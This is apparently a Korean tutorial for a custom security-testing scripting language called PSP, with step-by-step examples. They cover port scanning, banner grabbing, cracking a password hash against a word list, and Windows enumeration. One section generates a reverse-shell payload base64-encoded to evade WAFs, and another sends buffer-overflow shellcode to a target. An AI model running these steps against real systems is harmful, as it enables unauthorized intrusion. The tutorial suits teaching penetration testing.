# PSP 튜토리얼 - 단계별 학습 가이드

## 1단계: PSP 시작하기

### PSP 설치
```bash
git clone https://github.com/your-repo/PSP-Language.git
cd PSP-Language
python src/psp_interpreter.py -i
```

### 첫 번째 프로그램
```psp
# hello.pspp
print("안녕하세요, PSP 세계!")
```

실행:
```bash
python src/psp_interpreter.py examples/hello.pspp
```

## 2단계: 기본 문법 익히기

### 변수와 데이터 타입
```psp
# 문자열
target_ip = "192.168.1.100"
banner = "HTTP/1.1 200 OK"

# 숫자
port = 80
timeout = 5.5
is_vulnerable = true

# 배열
ports = [80, 443, 22, 21]
services = ["http", "https", "ssh", "ftp"]

# 출력
print("타겟:", target_ip)
printf("포트 %d 스캔 시작", port)
```

### 조건문
```psp
target = "192.168.1.1"
port = 80

if scan_port(target, port) {
    print("포트가 열려있습니다!")
    
    # 배너 그래빙
    banner = recv(target, port, 512)
    if "Apache" in banner {
        print("Apache 웹서버 발견")
    } else if "nginx" in banner {
        print("Nginx 웹서버 발견")
    } else {
        print("알 수 없는 웹서버")
    }
} else {
    print("포트가 닫혀있습니다.")
}
```

### 반복문
```psp
# 포트 스캔
target = "192.168.1.1"
common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995]

print("포트 스캔 시작...")
for port in common_ports {
    if scan_port(target, port) {
        printf("포트 %d: 열림", port)
    }
}

# 범위 스캔
print("1-100 포트 스캔...")
for i in range(1, 101) {
    if scan_port(target, i) {
        printf("포트 %d: 열림", i)
    }
}
```

## 3단계: 네트워크 스캔 마스터하기

### 기본 포트 스캔
```psp
# basic_scan.pspp
target = "192.168.1.100"

# 단일 포트 확인
if scan_port(target, 80) {
    print("웹 서버 발견!")
}

# 포트 범위 스캔
open_ports = scan_range(target, 1, 1000)
printf("열린 포트: %s", open_ports)

# 중요 포트들 확인
critical_ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 993, 995, 1433, 3389]
for port in critical_ports {
    if scan_port(target, port) {
        printf("중요 포트 %d가 열려있습니다!", port)
    }
}
```

### 서비스 식별
```psp
# service_detection.pspp
target = "192.168.1.100"
open_ports = scan_range(target, 1, 1000)

for port in open_ports {
    banner = recv(target, port, 1024)
    if banner {
        printf("포트 %d 배너: %s", port, banner)
        
        # 서비스 식별
        if port == 80 or port == 8080 {
            if "Apache" in banner {
                print("Apache HTTP 서버")
            } else if "nginx" in banner {
                print("Nginx HTTP 서버")
            } else if "IIS" in banner {
                print("Microsoft IIS 서버")
            }
        } else if port == 22 {
            print("SSH 서비스")
        } else if port == 21 {
            print("FTP 서비스")
        }
    }
}
```

## 4단계: 암호화와 해싱 활용

### 패스워드 크래킹 준비
```psp
# password_hash.pspp
passwords = ["admin", "password", "123456", "admin123", "root"]
target_hash = "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"  # "password"의 SHA256

print("패스워드 크래킹 시작...")
for password in passwords {
    hash_value = sha256(password)
    printf("시도: %s -> %s", password, hash_value)
    
    if hash_value == target_hash {
        printf("패스워드 발견: %s", password)
        break
    }
}
```

### 데이터 인코딩/디코딩
```psp
# encoding.pspp
original_data = "admin:password123"
print("원본 데이터:", original_data)

# Base64 인코딩
encoded = base64_encode(original_data)
print("Base64 인코딩:", encoded)

# 디코딩
decoded = base64_decode(encoded)
print("디코딩:", decoded)

# 해시 비교
md5_hash = md5(original_data)
sha1_hash = sha1(original_data)
sha256_hash = sha256(original_data)

print("MD5:", md5_hash)
print("SHA1:", sha1_hash)
print("SHA256:", sha256_hash)
```

## 5단계: 익스플로잇과 페이로드

### 리버스 셸 생성
```psp
# reverse_shell.pspp
attacker_ip = "192.168.1.50"
attacker_port = 4444

# 리버스 셸 페이로드 생성
payload = create_payload("reverse_shell", attacker_ip)
print("리버스 셸 페이로드:")
print(payload)

# Base64로 인코딩 (WAF 우회용)
encoded_payload = base64_encode(payload)
print("인코딩된 페이로드:")
print(encoded_payload)
```

### 버퍼 오버플로우 테스트
```psp
# buffer_overflow.pspp
target_ip = "192.168.1.100"
target_port = 9999

# 패턴 생성
pattern_size = 1000
pattern = buffer_overflow(pattern_size, "A")
print("패턴 생성 완료, 크기:", len(pattern))

# 셸코드 생성
shellcode_x64 = shellcode("x64")
shellcode_x86 = shellcode("x86")

print("x64 셸코드:", shellcode_x64)
print("x86 셸코드:", shellcode_x86)

# 최종 익스플로잇 페이로드
exploit = pattern + shellcode_x64
print("익스플로잇 페이로드 크기:", len(exploit))

# 페이로드 전송
if connect(target_ip, target_port) {
    send(target_ip, target_port, exploit)
    print("익스플로잇 페이로드 전송 완료")
} else {
    print("타겟에 연결할 수 없습니다.")
}
```

## 6단계: 윈도우 시스템 정보 수집

### 프로세스 및 서비스 분석
```psp
# system_analysis.pspp
print("시스템 분석 시작...")

# 프로세스 열거
processes = enum_processes()
print("실행 중인 프로세스:")
for process in processes {
    if "svchost" in process.lower() {
        print("시스템 프로세스:", process)
    } else if "powershell" in process.lower() {
        print("PowerShell 프로세스 발견:", process)
    }
}

# 서비스 열거
services = enum_services()
print("윈도우 서비스:")
running_count = 0
for service in services {
    if "RUNNING" in service {
        running_count = running_count + 1
    }
}
printf("실행 중인 서비스: %d개", running_count)
```

### 레지스트리 분석
```psp
# registry_analysis.pspp
print("레지스트리 분석...")

# 자동 실행 프로그램 확인
autorun_keys = [
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
]

for key in autorun_keys {
    value = registry_read(key)
    if value {
        printf("자동 실행 키 %s에 항목이 있습니다", key)
        print(value)
    }
}

# 시스템 정보 수집
system_info = registry_read("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName")
build_number = registry_read("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild")

print("운영체제:", system_info)
print("빌드 번호:", build_number)
```

## 7단계: 파일 시스템 조작

### 파일 검색 및 분석
```psp
# file_analysis.pspp
print("파일 시스템 분석...")

# 중요 디렉터리 확인
important_dirs = [
    "C:\\Windows\\System32",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    "C:\\Users\\Public",
    "C:\\Temp"
]

for dir in important_dirs {
    if file_exists(dir) {
        files = dir_list(dir)
        printf("디렉터리 %s: %d개 파일", dir, len(files))
    }
}

# 의심스러운 파일 검색
suspicious_files = [
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\System32\\powershell.exe",
    "C:\\Windows\\System32\\net.exe",
    "C:\\Windows\\System32\\netsh.exe"
]

for file in suspicious_files {
    if file_exists(file) {
        printf("시스템 도구 %s 발견", file)
    }
}
```

### 로그 파일 생성
```psp
# logging.pspp
print("보안 테스트 보고서 생성...")

# 보고서 내용 작성
report = "PSP 보안 테스트 보고서\n"
report = report + "====================\n\n"

# 시스템 정보 추가
processes = enum_processes()
services = enum_services()

report = report + "시스템 정보:\n"
report = report + "- 프로세스 수: " + str(len(processes)) + "\n"
report = report + "- 서비스 수: " + str(len(services)) + "\n\n"

# 네트워크 스캔 결과 추가
target = "127.0.0.1"
open_ports = scan_range(target, 1, 100)
report = report + "네트워크 스캔 결과:\n"
report = report + "- 타겟: " + target + "\n"
report = report + "- 열린 포트: " + str(open_ports) + "\n\n"

# 보고서 저장
file_write("security_report.txt", report)
print("보고서가 security_report.txt에 저장되었습니다.")

# 로그 메시지
log("보안 테스트 완료", "SUCCESS")
log("보고서 생성 완료", "INFO")
```

## 8단계: 고급 기능

### 함수 정의와 사용
```psp
# advanced_functions.pspp

# 사용자 정의 함수 (향후 지원 예정)
function advanced_port_scan(target, ports) {
    results = []
    for port in ports {
        if scan_port(target, port) {
            banner = recv(target, port, 512)
            result = {"port": port, "banner": banner}
            results.append(result)
        }
    }
    return results
}

# 함수 사용
target = "192.168.1.1"
important_ports = [21, 22, 80, 443, 3389]
scan_results = advanced_port_scan(target, important_ports)

for result in scan_results {
    printf("포트 %d: %s", result["port"], result["banner"])
}
```

이 튜토리얼을 통해 PSP의 기본 사용법부터 고급 보안 테스팅 기법까지 단계별로 학습할 수 있습니다. 각 단계의 예제를 실행하면서 PSP 언어에 익숙해지시기 바랍니다.
